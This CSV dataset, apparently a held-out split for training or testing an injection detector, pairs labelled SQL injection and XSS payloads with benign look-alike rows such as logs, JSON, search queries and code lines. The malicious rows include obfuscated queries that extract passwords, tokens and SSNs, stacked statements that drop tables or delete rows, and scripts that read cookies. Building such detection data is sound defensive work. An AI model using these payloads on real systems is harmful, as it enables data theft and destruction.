text,label,attack_type,category,generator
#<object onbegin=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
'	Or%200x61=0x61%0a#,1,sqli,boolean_blind,held_out
"1/**/UNIoN alL/*!*/sELEcT/**/role,NULL/*!*/FRoM/*!*/staff -- -",1,sqli,union,held_out
""" ANd+updatexml(1,concat(0x7e,(select%0apassword%20from%20admins%09limit+1)),1)#",1,sqli,error,held_out
1%0aor 'a'LiKE'a'	/*z*/,1,sqli,boolean_blind,held_out
<audio%20onmouseover=print()><!--stored-->,1,xss,stored,held_out
#<form onbegin=(alert)(1)>,1,xss,dom,held_out
1/*!*/and%20(SELECT%0a1/**/from%20(SELECT(sleEP(3)))x)%2d%2d ,1,sqli,time_blind,held_out
"#"";(alert)(1);//",1,xss,dom,held_out
"')/**/And/**_**/extractvalue(1,concat(0x7e,(select/**/token/*!*/from%09products limit%091)))-- -",1,sqli,error,held_out
<svg/onpointerover=alert(document.cookie)>,1,xss,reflected,held_out
'-print()-',1,xss,attribute,held_out
1;/**_**/wAITfOr%0aDelAy+'0:0:8'%20#,1,sqli,time_blind,held_out
%27+Or	0x61=0x61+-- 	,1,sqli,boolean_blind,held_out
"%27/**_**/UniOn	aLl%09seLect/*!*/NULL,ssn,name,NULL,CHAR(120)%0afrom staff%09%2d%2d ",1,sqli,union,held_out
"1%09ANd/*!*/updatexml(1,concat(0x7e,(select%0ahash+from sessions limit/**/1)),1)-- ",1,sqli,error,held_out
"""	onpointerover=alert(String.fromCharCode(88,83,83))	x=""",1,xss,attribute,held_out
%27;/**/iNSeRT	INtO%0amembers	VaLues(1)/**_**/#,1,sqli,stacked,held_out
"`%09anD+extractvalue(1,concat(0x7e,(select%0abalance	from orders	limit/*!*/1)))/*z*/",1,sqli,error,held_out
#<video onfocus=alert(1)>,1,xss,dom,held_out
`/*!*/aND/**_**/(SELECT 1%20fROM/**_**/(SELECT(SLEeP(4)))x)/*z*/,1,sqli,time_blind,held_out
"""><object onerror=alert(1)>",1,xss,attribute,held_out
"<svg/onmouseover=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
<svg onmouseover=top['al'+'ert'](1)><!--comment-->,1,xss,stored,held_out
"""
onfocus=print()
x=""",1,xss,attribute,held_out
'+or%095BEtween%200%09And%209%0a-- ,1,sqli,boolean_blind,held_out
#<svg onerror=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
<sCrIpT>eval(atob('YWxlcnQoMSk='))</sCrIpT>,1,xss,reflected,held_out
"data:text/html,<audio onfocus=alert(document.cookie)>",1,xss,dom,held_out
<marqueeonpointerover=top['al'+'ert'](1)><!--stored-->,1,xss,stored,held_out
')/*!*/or+'a'Like'a' -- 	,1,sqli,boolean_blind,held_out
"')%20ANd/*!*/updatexml(1,concat(0x7e,(select+password/**/from%09clients/**/limit+1)),1)-- ",1,sqli,error,held_out
%27%0aOR	token=0x726f6f74%2d%2d ,1,sqli,hex_obf,held_out
<math onbegin=(alert)(1)>,1,xss,reflected,held_out
"%27%0aoR	ssn=CHAR(115,101,108,101,99,116)%2d%2d ",1,sqli,hex_obf,held_out
<svg/onbegin=top['al'+'ert'](1)>,1,xss,reflected,held_out
%27; uPDaTE+members%0asET%09role=1	-- -,1,sqli,stacked,held_out
<objectonerror=top['al'+'ert'](1)>,1,xss,reflected,held_out
"<audio onpointerover=alert(String.fromCharCode(88,83,83))><!--stored-->",1,xss,stored,held_out
<body%09onerror=(alert)(1)><!--comment-->,1,xss,stored,held_out
"<object
onpointerover=top['al'+'ert'](1)>",1,xss,reflected,held_out
"""/onbegin=top['al'+'ert'](1)/x=""",1,xss,attribute,held_out
<formonerror=alert(document.cookie)>,1,xss,reflected,held_out
#<video onerror=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
<math%20onpointerover=(alert)(1)><!--comment-->,1,xss,stored,held_out
' Or	'b'LIkE'b'%09-- 	,1,sqli,boolean_blind,held_out
');%20DElETe%09FRoM clients%20-- 	,1,sqli,stacked,held_out
<iframe%09onbegin=top['al'+'ert'](1)>,1,xss,reflected,held_out
"')	UniOn/**_**/all	SElECT/**_**/CHAR(120),CHAR(120),CHAR(120),0x78	fRom+clients%09#",1,sqli,union,held_out
<sCrIpT>alert(1)</sCrIpT>,1,xss,reflected,held_out
"data:text/html,<audio onstart=top['al'+'ert'](1)>",1,xss,dom,held_out
<audio%09onanimationstart=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
"' Union%20aLl/**/SELECT/**_**/balance,0x78/**/FROm/**_**/tokens%09-- ",1,sqli,union,held_out
<iframe onmouseover=alert(1)><!--stored-->,1,xss,stored,held_out
"<svg
onanimationstart=alert(1)><!--stored-->",1,xss,stored,held_out
"""+Or role=0x73656c656374-- 	",1,sqli,hex_obf,held_out
%27/**_**/Or/**/0x61=0x61/**_**/-- -,1,sqli,boolean_blind,held_out
"1%0aanD+extractvalue(1,concat(0x7e,(select password/**_**/from%09members%0alimit+1)))%2d%2d ",1,sqli,error,held_out
"%27/**_**/UnIOn+ALl	SELeCt/**/CHAR(120),0x78,token/**/FRoM%09accounts/**/#",1,sqli,union,held_out
"""/**/uniOn/*!*/ALL/*!*/selEcT+CHAR(120),name,id,0x78,name+FrOm+staff -- 	",1,sqli,union,held_out
"data:text/html,<object onpointerover=window['ale'+'rt']`1`>",1,xss,dom,held_out
<math	onbegin=print()><!--stored-->,1,xss,stored,held_out
#<object onmouseover=(alert)(1)>,1,xss,dom,held_out
"data:text/html,<marquee onpointerover=top['al'+'ert'](1)>",1,xss,dom,held_out
`;+dEleTE+fROm+sessions%20-- ,1,sqli,stacked,held_out
'%20onpointerover=print()%20',1,xss,attribute,held_out
"'/*!*/aNd/*!*/(select%09count(*)%09from+products	group%09by%09concat((select/**_**/id%0afrom+orders	limit/**_**/1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
"""; WaItfor/*!*/Delay/**/'0:0:9'/**_**/-- ",1,sqli,time_blind,held_out
%27/**_**/OR	SleeP(5)%09#,1,sqli,time_blind,held_out
#<iframe onpointerover=alert(document.cookie)>,1,xss,dom,held_out
%27%20Or%207=6/**/-- -,1,sqli,boolean_blind,held_out
"`%20uNiOn	All/**_**/seLECt%20NULL,NULL+fROM/**_**/tokens	-- -",1,sqli,union,held_out
"data:text/html,<audio onfocus=eval(atob('YWxlcnQoMSk='))>",1,xss,dom,held_out
"data:text/html,<marquee onanimationstart=window['ale'+'rt']`1`>",1,xss,dom,held_out
#<iframe onbegin=(alert)(1)>,1,xss,dom,held_out
"<svg%09ontoggle=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
#<svg onload=window['ale'+'rt']`1`>,1,xss,dom,held_out
"""	anD%09(select%0acount(*)/**/from/*!*/admins/**/group/**/by/*!*/concat((select%0assn+from%20orders%20limit 1),floor(rand(0)*2)))#",1,sqli,error,held_out
';%09dRop/**/TAble/*!*/tokens -- 	,1,sqli,stacked,held_out
"""
onfocus=window['ale'+'rt']`1`
x=""",1,xss,attribute,held_out
"data:text/html,<iframe onerror=top['al'+'ert'](1)>",1,xss,dom,held_out
#<img onload=top['al'+'ert'](1)>,1,xss,dom,held_out
'%0aOR id=0x756e696f6e-- 	,1,sqli,hex_obf,held_out
"""	oR+slEeP(5)/**_**/#",1,sqli,time_blind,held_out
')	oR%097BeTWeEN/**_**/0/**/ANd/**/9	-- ,1,sqli,boolean_blind,held_out
`;%20upDAtE+users%0aseT/**/ssn=1/**_**/-- -,1,sqli,stacked,held_out
"%27%20anD (select	count(*)%09from%0aclients group%0aby%09concat((select%09email/**_**/from/*!*/users/**_**/limit	1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
""";/**_**/dRop/*!*/tablE%0aproducts	%2d%2d ",1,sqli,stacked,held_out
"""	Or+SleEp(9)%0a-- ",1,sqli,time_blind,held_out
"'/**/uniON/**_**/all/**/SelECt CHAR(120),token,0x78/*!*/From products/**/-- -",1,sqli,union,held_out
1%0aor%0a3=5+-- ,1,sqli,boolean_blind,held_out
')/*!*/or%091bETwEen/**_**/0%09AND%209+-- 	,1,sqli,boolean_blind,held_out
""";/*!*/UPdAte%09staff	SEt%0assn=1	%2d%2d ",1,sqli,stacked,held_out
"data:text/html,<iframe onanimationstart=(alert)(1)>",1,xss,dom,held_out
"1 aND/*!*/extractvalue(1,concat(0x7e,(select/**_**/balance%09from members limit%091)))-- ",1,sqli,error,held_out
'%09onstart=alert(document.cookie)%09',1,xss,attribute,held_out
"')/*!*/AnD%0aextractvalue(1,concat(0x7e,(select/**_**/email from%09accounts%0alimit	1)))-- ",1,sqli,error,held_out
df = df[df['id'] > 33]  # filter,0,benign,benign,held_out
2026-08-25 13:08 WARN [db] user='u20' path=/api?id=490 retry,0,benign,benign,held_out
GET /assets/app.js?v=6.5 200 46ms,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE53 at checkout.,0,benign,benign,held_out
2026-08-25 10:04 WARN [auth] user='u16' path=/api?id=535 retry,0,benign,benign,held_out
df = df[df['price'] > 42]  # filter,0,benign,benign,held_out
GET /assets/app.js?v=2.9 200 26ms,0,benign,benign,held_out
df = df[df['id'] > 49]  # filter,0,benign,benign,held_out
if (n%2==0) { return -1; },0,benign,benign,held_out
GET /assets/app.js?v=7.9 200 18ms,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE82 at checkout.,0,benign,benign,held_out
GET /assets/app.js?v=7.5 200 67ms,0,benign,benign,held_out
2026-08-25 14:07 WARN [db] user='u54' path=/api?id=69 retry,0,benign,benign,held_out
"Address: 6 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 21}",0,benign,benign,held_out
df = df[df['price'] > 35]  # filter,0,benign,benign,held_out
"{""query"": ""SELECT name FROM contacts"", ""params"": [2], ""safe"": true}",0,benign,benign,held_out
2026-08-25 10:08 INFO [db] user='u19' path=/api?id=680 retry,0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 57}",0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE63 at checkout.,0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 9}",0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 61}",0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 82}",0,benign,benign,held_out
GET /assets/app.js?v=5.1 200 67ms,0,benign,benign,held_out
2026-08-25 18:05 INFO [auth] user='u84' path=/api?id=243 retry,0,benign,benign,held_out
GET /assets/app.js?v=6.9 200 3ms,0,benign,benign,held_out
"Address: 40 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
"Address: 13 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
"Address: 95 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
/products?category=union-suits&sort=name,0,benign,benign,held_out
"Address: 61 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 5}",0,benign,benign,held_out
"Address: 82 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
/search?q=AND/OR%20logic%20review,0,benign,benign,held_out
GET /assets/app.js?v=2.9 200 62ms,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE38 at checkout.,0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""needs review"", ""qty"": 70}",0,benign,benign,held_out
"Address: 73 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
/products?category=select-cuts&sort=price,0,benign,benign,held_out
"Address: 10 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 50}",0,benign,benign,held_out
2026-08-25 10:07 WARN [db] user='u61' path=/api?id=399 ok,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE29 at checkout.,0,benign,benign,held_out
GET /assets/app.js?v=2.1 200 38ms,0,benign,benign,held_out
2026-08-25 16:07 WARN [http] user='u58' path=/api?id=972 ok,0,benign,benign,held_out
GET /assets/app.js?v=1.9 200 71ms,0,benign,benign,held_out
2026-08-25 18:07 INFO [auth] user='u14' path=/api?id=710 ok,0,benign,benign,held_out
/products?category=books&sort=name,0,benign,benign,held_out
GET /assets/app.js?v=9.8 200 57ms,0,benign,benign,held_out
df = df[df['qty'] > 93]  # filter,0,benign,benign,held_out
df = df[df['qty'] > 89]  # filter,0,benign,benign,held_out
GET /assets/app.js?v=1.1 200 8ms,0,benign,benign,held_out
2026-08-25 14:00 WARN [db] user='u68' path=/api?id=714 ok,0,benign,benign,held_out
df = df[df['price'] > 25]  # filter,0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 85}",0,benign,benign,held_out
df = df[df['price'] > 50]  # filter,0,benign,benign,held_out
df = df[df['id'] > 94]  # filter,0,benign,benign,held_out
GET /assets/app.js?v=8.5 200 12ms,0,benign,benign,held_out
df = df[df['price'] > 76]  # filter,0,benign,benign,held_out
"Address: 80 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
"Address: 40 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
GET /assets/app.js?v=4.3 200 29ms,0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 3}",0,benign,benign,held_out
df = df[df['id'] > 69]  # filter,0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 37}",0,benign,benign,held_out
"Address: 25 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
df = df[df['qty'] > 37]  # filter,0,benign,benign,held_out
"Address: 50 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
GET /assets/app.js?v=3.5 200 8ms,0,benign,benign,held_out
/search?q=script%20writing%20best%20price,0,benign,benign,held_out
GET /assets/app.js?v=1.8 200 99ms,0,benign,benign,held_out
"Address: 78 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
GET /assets/app.js?v=8.3 200 26ms,0,benign,benign,held_out
2026-08-25 12:04 INFO [db] user='u18' path=/api?id=783 ok,0,benign,benign,held_out
df = df[df['id'] > 1]  # filter,0,benign,benign,held_out
/search?q=invoice%20near%20me,0,benign,benign,held_out
2026-08-25 11:03 INFO [db] user='u47' path=/api?id=636 200,0,benign,benign,held_out
df = df[df['id'] > 27]  # filter,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE36 at checkout.,0,benign,benign,held_out
GET /assets/app.js?v=4.4 200 80ms,0,benign,benign,held_out
"Address: 48 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 2}",0,benign,benign,held_out
"Address: 58 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
df = df[df['qty'] > 67]  # filter,0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 65}",0,benign,benign,held_out
/search?q=1%3D1%20meme%20review,0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 20}",0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE60 at checkout.,0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 3}",0,benign,benign,held_out
GET /assets/app.js?v=3.9 200 76ms,0,benign,benign,held_out
"Address: 46 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 1}",0,benign,benign,held_out
2026-08-25 10:07 WARN [auth] user='u92' path=/api?id=448 200,0,benign,benign,held_out
2026-08-25 17:07 INFO [db] user='u58' path=/api?id=814 200,0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 35}",0,benign,benign,held_out
df = df[df['price'] > 95]  # filter,0,benign,benign,held_out
df = df[df['price'] > 20]  # filter,0,benign,benign,held_out
/products?category=union-suits&sort=price,0,benign,benign,held_out
GET /assets/app.js?v=1.1 200 11ms,0,benign,benign,held_out
GET /assets/app.js?v=6.9 200 25ms,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE81 at checkout.,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE51 at checkout.,0,benign,benign,held_out
GET /assets/app.js?v=8.2 200 61ms,0,benign,benign,held_out
2026-08-25 15:02 INFO [db] user='u69' path=/api?id=165 retry,0,benign,benign,held_out
/search?q=order%20by%20phone%20best%20price,0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 3}",0,benign,benign,held_out
df = df[df['id'] > 3]  # filter,0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 53}",0,benign,benign,held_out
"Address: 77 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
if (x!=y) { return true; },0,benign,benign,held_out
2026-08-25 15:05 WARN [http] user='u96' path=/api?id=989 ok,0,benign,benign,held_out
2026-08-25 18:04 INFO [db] user='u96' path=/api?id=105 ok,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE43 at checkout.,0,benign,benign,held_out
/search?q=drop%20shipping%20best%20price,0,benign,benign,held_out
2026-08-25 14:06 WARN [auth] user='u72' path=/api?id=148 ok,0,benign,benign,held_out
if (x!=y) { return -1; },0,benign,benign,held_out
"Team, the SELECT committee will review 5+ vendors where cost < budget.",0,benign,benign,held_out
df = df[df['id'] > 83]  # filter,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE70 at checkout.,0,benign,benign,held_out
grep -rn 'FIXME' src/ | wc -l,0,benign,benign,held_out
/search?q=red%20%26%20blue%202024,0,benign,benign,held_out
df = df[df['qty'] > 29]  # filter,0,benign,benign,held_out
"Address: 61 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
df = df[df['price'] > 63]  # filter,0,benign,benign,held_out
df = df[df['price'] > 15]  # filter,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE16 at checkout.,0,benign,benign,held_out
GET /assets/app.js?v=5.0 200 10ms,0,benign,benign,held_out
2026-08-25 15:00 WARN [http] user='u21' path=/api?id=561 200,0,benign,benign,held_out
GET /assets/app.js?v=2.4 200 56ms,0,benign,benign,held_out
GET /assets/app.js?v=1.2 200 55ms,0,benign,benign,held_out
/search?q=drop%20shipping%20review,0,benign,benign,held_out
GET /assets/app.js?v=4.6 200 41ms,0,benign,benign,held_out
GET /assets/app.js?v=1.6 200 6ms,0,benign,benign,held_out
/search?q=red%20%26%20blue%20best%20price,0,benign,benign,held_out
"Address: 11 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
/products?category=select-cuts&sort=name,0,benign,benign,held_out
GET /assets/app.js?v=4.0 200 74ms,0,benign,benign,held_out
GET /assets/app.js?v=8.9 200 57ms,0,benign,benign,held_out
/api/v2/users?filter=id%3E100,0,benign,benign,held_out
GET /assets/app.js?v=3.4 200 6ms,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE90 at checkout.,0,benign,benign,held_out
GET /assets/app.js?v=1.8 200 39ms,0,benign,benign,held_out
/search?q=admin%20panel%20guide%20near%20me,0,benign,benign,held_out
"Address: 72 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
df = df[df['qty'] > 16]  # filter,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE19 at checkout.,0,benign,benign,held_out
2026-08-25 11:08 INFO [http] user='u83' path=/api?id=670 ok,0,benign,benign,held_out
GET /assets/app.js?v=7.5 200 29ms,0,benign,benign,held_out
/api/v2/users?filter=role%20in%20%28admin%2Cuser%29,0,benign,benign,held_out
df = df[df['qty'] > 28]  # filter,0,benign,benign,held_out
"Address: 42 O'Malley Ave, Apt #7, (near park)",0,benign,benign,held_out
GET /assets/app.js?v=5.7 200 69ms,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE66 at checkout.,0,benign,benign,held_out
GET /assets/app.js?v=5.1 200 61ms,0,benign,benign,held_out
2026-08-25 17:09 WARN [auth] user='u36' path=/api?id=48 200,0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 8}",0,benign,benign,held_out
GET /assets/app.js?v=4.0 200 97ms,0,benign,benign,held_out
df = df[df['id'] > 36]  # filter,0,benign,benign,held_out
"Address: 35 O'Malley Ave, Apt #9, (near park)",0,benign,benign,held_out
"Address: 78 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
df = df[df['price'] > 59]  # filter,0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 56}",0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 33}",0,benign,benign,held_out
"{""query"": ""SELECT name FROM contacts"", ""params"": [4], ""safe"": true}",0,benign,benign,held_out
GET /assets/app.js?v=8.9 200 8ms,0,benign,benign,held_out
GET /assets/app.js?v=4.3 200 44ms,0,benign,benign,held_out
GET /assets/app.js?v=6.3 200 32ms,0,benign,benign,held_out
GET /assets/app.js?v=9.6 200 22ms,0,benign,benign,held_out
GET /assets/app.js?v=6.5 200 26ms,0,benign,benign,held_out
GET /assets/app.js?v=2.6 200 18ms,0,benign,benign,held_out
2026-08-25 12:07 WARN [http] user='u79' path=/api?id=53 retry,0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 81}",0,benign,benign,held_out
2026-08-25 11:01 WARN [http] user='u57' path=/api?id=275 200,0,benign,benign,held_out
if (a==b) { return true; },0,benign,benign,held_out
/search?q=union%20station%20best%20price,0,benign,benign,held_out
GET /assets/app.js?v=4.6 200 82ms,0,benign,benign,held_out
"Address: 93 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
2026-08-25 15:07 INFO [db] user='u51' path=/api?id=802 200,0,benign,benign,held_out
"Address: 71 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 97}",0,benign,benign,held_out
GET /assets/app.js?v=8.5 200 84ms,0,benign,benign,held_out
2026-08-25 15:01 WARN [db] user='u97' path=/api?id=118 ok,0,benign,benign,held_out
2026-08-25 10:02 INFO [http] user='u92' path=/api?id=376 200,0,benign,benign,held_out
"Address: 24 O'Malley Ave, Apt #7, (near park)",0,benign,benign,held_out
"Address: 20 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE20 at checkout.,0,benign,benign,held_out
GET /assets/app.js?v=6.5 200 82ms,0,benign,benign,held_out
GET /assets/app.js?v=5.7 200 60ms,0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 18}",0,benign,benign,held_out
const url = `https://api.x.io/v1/users?limit=${n}`;,0,benign,benign,held_out
if (x!=y) { return null; },0,benign,benign,held_out
GET /assets/app.js?v=4.4 200 15ms,0,benign,benign,held_out
/search?q=invoice%202024,0,benign,benign,held_out
2026-08-25 16:07 WARN [db] user='u21' path=/api?id=294 200,0,benign,benign,held_out
"Address: 96 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE77 at checkout.,0,benign,benign,held_out
"{""query"": ""SELECT name FROM contacts"", ""params"": [6], ""safe"": true}",0,benign,benign,held_out
2026-08-25 18:04 INFO [db] user='u28' path=/api?id=392 retry,0,benign,benign,held_out
df = df[df['id'] > 75]  # filter,0,benign,benign,held_out
2026-08-25 15:01 INFO [http] user='u19' path=/api?id=146 200,0,benign,benign,held_out
"Address: 12 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE93 at checkout.,0,benign,benign,held_out
"Address: 91 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
df = df[df['qty'] > 6]  # filter,0,benign,benign,held_out
"{""query"": ""SELECT name FROM contacts"", ""params"": [7], ""safe"": true}",0,benign,benign,held_out
2026-08-25 10:06 WARN [http] user='u22' path=/api?id=379 ok,0,benign,benign,held_out
/search?q=script%20writing%202024,0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 48}",0,benign,benign,held_out
GET /assets/app.js?v=4.3 200 31ms,0,benign,benign,held_out
"Address: 88 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 47}",0,benign,benign,held_out
"Address: 79 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
df = df[df['price'] > 88]  # filter,0,benign,benign,held_out
if (n%2==0) { return true; },0,benign,benign,held_out
"Address: 52 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
GET /assets/app.js?v=8.1 200 8ms,0,benign,benign,held_out
"awk -F',' '{print $4}' data.csv",0,benign,benign,held_out
df = df[df['price'] > 53]  # filter,0,benign,benign,held_out
2026-08-25 17:02 INFO [http] user='u76' path=/api?id=351 ok,0,benign,benign,held_out
2026-08-25 15:08 INFO [db] user='u1' path=/api?id=505 ok,0,benign,benign,held_out
df = df[df['qty'] > 88]  # filter,0,benign,benign,held_out
"Address: 76 O'Malley Ave, Apt #9, (near park)",0,benign,benign,held_out
GET /assets/app.js?v=6.3 200 43ms,0,benign,benign,held_out
if (a==b) { return -1; },0,benign,benign,held_out
df = df[df['id'] > 72]  # filter,0,benign,benign,held_out
GET /assets/app.js?v=9.7 200 5ms,0,benign,benign,held_out
"Address: 45 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 85}",0,benign,benign,held_out
"Address: 41 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
"Address: 39 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 10}",0,benign,benign,held_out
"Address: 99 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
"Address: 81 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
"Address: 87 O'Malley Ave, Apt #7, (near park)",0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE54 at checkout.,0,benign,benign,held_out
2026-08-25 16:00 INFO [http] user='u53' path=/api?id=762 retry,0,benign,benign,held_out
/search?q=invoice%20review,0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 49}",0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE62 at checkout.,0,benign,benign,held_out
"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 46}",0,benign,benign,held_out
df = df[df['price'] > 67]  # filter,0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 1}",0,benign,benign,held_out
/search?q=select%20size%20best%20price,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE98 at checkout.,0,benign,benign,held_out
df = df[df['id'] > 21]  # filter,0,benign,benign,held_out
df = df[df['id'] > 23]  # filter,0,benign,benign,held_out
/search?q=drop%20shipping%202024,0,benign,benign,held_out
"Address: 20 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
"Address: 25 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
df = df[df['qty'] > 4]  # filter,0,benign,benign,held_out
"Address: 39 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
GET /assets/app.js?v=4.6 200 95ms,0,benign,benign,held_out
Discount: buy 2 & save 10%; use code SAVE79 at checkout.,0,benign,benign,held_out
"{""user"": ""o'connor"", ""note"": ""needs review"", ""qty"": 90}",0,benign,benign,held_out
